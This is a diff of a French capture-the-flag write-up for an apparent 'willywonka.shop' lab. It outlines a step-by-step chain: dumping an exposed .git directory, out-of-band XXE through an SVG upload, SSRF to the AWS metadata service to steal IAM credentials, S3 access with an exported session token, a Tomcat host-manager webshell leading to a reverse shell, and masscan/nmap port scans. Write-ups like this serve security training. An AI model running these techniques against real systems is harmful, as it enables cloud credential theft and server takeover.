@@ -6,7 +6,7 @@
 
 ## Step 1
 
-More detail: ['Step1'](./step1.md)
+More detail: [Step1](./step1.md)
 
 1. dirsearch -> .git
 2. GitTools -> dumper -> extractor
@@ -16,7 +16,7 @@ More detail: ['Step1'](./step1.md)
 
 ## Step 2
 
-More detail: ['Step2'](./step2.md)
+More detail: [Step2](./step2.md)
 
 1. trouver le debug=1 dans le .git
 2. aller sur la page /reset
@@ -32,7 +32,7 @@ More detail: ['Step2'](./step2.md)
 
 ## Step 3
 
-More detail: ['Step3'](./step3.md)
+More detail: [Step3](./step3.md)
 
 1. réussir à trig la xxe via svg : [rest.svg](./step3/rect.svg)
 2. upload [ro.svg](./step3/ro.svg) à l'adresse : http://willywonka.shop/profile?filetype=image%2fsvg%2bxml ==> XXE OOB
@@ -44,7 +44,7 @@ More detail: ['Step3'](./step3.md)
 
 ## Step 4
 
-More detail: ['Step4'](./step4.md)
+More detail: [Step4](./step4.md)
 
 1. pour chopper les creds du bucket, il faut taper sur http://169.254.169.254/latest/meta-data/iam/security-credentials/ grâce à la xxe
 2. récupérer les infos du bucket : http://169.254.169.254/latest/dynamic/instance-identity/document
@@ -53,6 +53,24 @@ More detail: ['Step4'](./step4.md)
 5. aws s3 cp s3://willywonka-shop/Flag-04.txt .
 
 > 0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528
+
+## Step 5
+
+More detail: [Step5](./step5.md)
+
+1. se connecter au vpn et checker les routes, voir : 172.16.42.0/32
+2. dirsearch avec la wordlist tomcat de seclist -> voir /host-manager/
+3. se connecter avec les creds tomcat : tomcat
+4. monter un partage "data" avec un webshell en bite.war dedans
+5. déployer cette nouvelle appli via les UNC path
+6. y accéder : http://maki-lab:8080/bite/index.jsp?cmd=whoami
+7. reverse shell -> flag
+
+> 8F30C4422EB4E5D9A2BF7EE44D5098D68314C35BE58E9919417B45FCBEF205C8
+
+## Step 6
+
+More detail: [Step6](./step6.md)
 
 ## Resources
 
@@ -65,6 +83,7 @@ More detail: ['Step4'](./step4.md)
 7. xxe oob : https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/
 8. s3 bucket ssrf metadata : https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/
 9. exploitation s3 via ssrf : https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/
+10. exploitation host-manager tomcat : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/
 
 ---
 
@@ -100,4 +119,13 @@ export AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjEDcaCWV1LXdlc3QtMyJIMEYCIQCclOqg51ncQQs
 aws s3 ls                                      
 aws s3 ls s3://willywonka-shop
 aws s3 cp s3://willywonka-shop/Flag-04.txt .
+```
+
+* port scan
+
+```
+IP='172.16.42.101'
+sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 $IP | tee out_mass
+PORT=`cat out_mass | cut -d ' ' -f4 | sed 's/\/.*$//' | tr '\n' ','`
+sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p$PORT $IP
 ```
